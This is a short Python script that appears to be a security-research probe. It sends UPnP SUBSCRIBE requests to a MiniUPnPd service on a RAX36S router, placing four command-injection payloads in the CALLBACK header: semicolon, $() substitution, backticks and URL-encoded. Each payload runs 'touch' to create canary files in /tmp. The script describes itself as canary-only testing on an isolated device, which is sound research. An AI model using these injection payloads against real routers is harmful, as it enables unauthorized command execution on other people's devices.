#!/usr/bin/env python3
"""Canary-only command-injection probes for isolated RAX36S MiniUPnPd."""

from __future__ import annotations

import socket


HOST = "192.168.1.1"
PORT = 56688


def exchange(callback: bytes) -> bytes:
    request = (
        b"SUBSCRIBE /evt/L3F HTTP/1.1\r\n"
        b"Host: 192.168.1.1:56688\r\n"
        b"CALLBACK: <" + callback + b">\r\n"
        b"NT: upnp:event\r\n"
        b"TIMEOUT: Second-30\r\n"
        b"Content-Length: 0\r\n"
        b"Connection: close\r\n\r\n"
    )
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        client.settimeout(3)
        client.bind(("192.168.1.2", 0))
        client.connect((HOST, PORT))
        client.sendall(request)
        client.shutdown(socket.SHUT_WR)
        chunks = bytearray()
        try:
            while len(chunks) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                chunks.extend(chunk)
        except TimeoutError:
            pass
    return bytes(chunks)


def main() -> int:
    cases = (
        ("semicolon", b"http://192.168.1.2/x;touch${IFS}/tmp/FRIDAY_RAX36S_SEMI"),
        ("substitution", b"http://192.168.1.2/$(touch${IFS}/tmp/FRIDAY_RAX36S_SUB)"),
        ("backticks", b"http://192.168.1.2/`touch${IFS}/tmp/FRIDAY_RAX36S_TICK`"),
        ("encoded", b"http://192.168.1.2/x%3Btouch%20/tmp/FRIDAY_RAX36S_ENC"),
    )
    for name, callback in cases:
        response = exchange(callback)
        status = response.splitlines()[0].decode("ascii", "replace") if response else "no-response"
        print(f"{name} callback_bytes={len(callback)} status={status}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
